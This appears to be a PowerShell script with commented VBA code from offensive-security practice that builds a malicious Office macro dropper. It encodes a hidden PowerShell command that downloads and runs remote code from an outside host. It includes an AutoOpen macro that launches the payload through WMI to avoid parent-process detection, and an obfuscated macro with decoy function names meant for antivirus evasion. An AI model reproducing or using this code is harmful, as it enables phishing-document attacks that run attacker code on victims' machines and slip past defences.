$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object
system.net.webclient).downloadstring('http://192.168.149.59/run.txt'))"

<#we can use anything in payload to change it -- #>

[string]$output = ""
$payload.ToCharArray() | %{
[string]$thischar = [byte][char]$_ + 17
if($thischar.Length -eq 1)
{
$thischar = [string]"00" + $thischar
$output += $thischar
}
elseif($thischar.Length -eq 2)
{
$thischar = [string]"0" + $thischar
$output += $thischar
}
elseif($thischar.Length -eq 3)
{
$output += $thischar
}
}
$output | clip


<#

basic macro script

Sub MyMacro
strArg = "powershell -exec bypass -nop -c iex((new-object
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
Mymacro
End Sub


use payload , winmgmts , win32process to convert for evasion

also this method will create a new process it will not execute as macro child process

#>

<#

Function Pears(Beets)
Pears = Chr(Beets - 17)
End Function
Function Strawberries(Grapes)
Strawberries = Left(Grapes, 3)
End Function
Function Almonds(Jelly)
Almonds = Right(Jelly, Len(Jelly) - 3)
End Function
Function Nuts(Milk)
Do
Oatmilk = Oatmilk + Pears(Strawberries(Milk))
Milk = Almonds(Milk)
Loop While Len(Milk) > 0
Nuts = Oatmilk
End Function
Function MyMacro()
Dim Apples As String
Dim Water As String

Apples = "12912813611813113212111812512504906211813711811604911513812911413213204906212712812904906213604912112211711711812704906211604912211813705705712711813606212811512311811613304913213813213311812606312711813306313611811511612512211812713305806311712813612712512"
81141171321331311221271200570561211331331290750640640660740670630660710730630660660740
63066067065064115128128124063133137133056058058"
Water = Nuts(Apples)
GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

#>

#obfuscated code after script execution , dont worry about function name they are used to evade the stuff

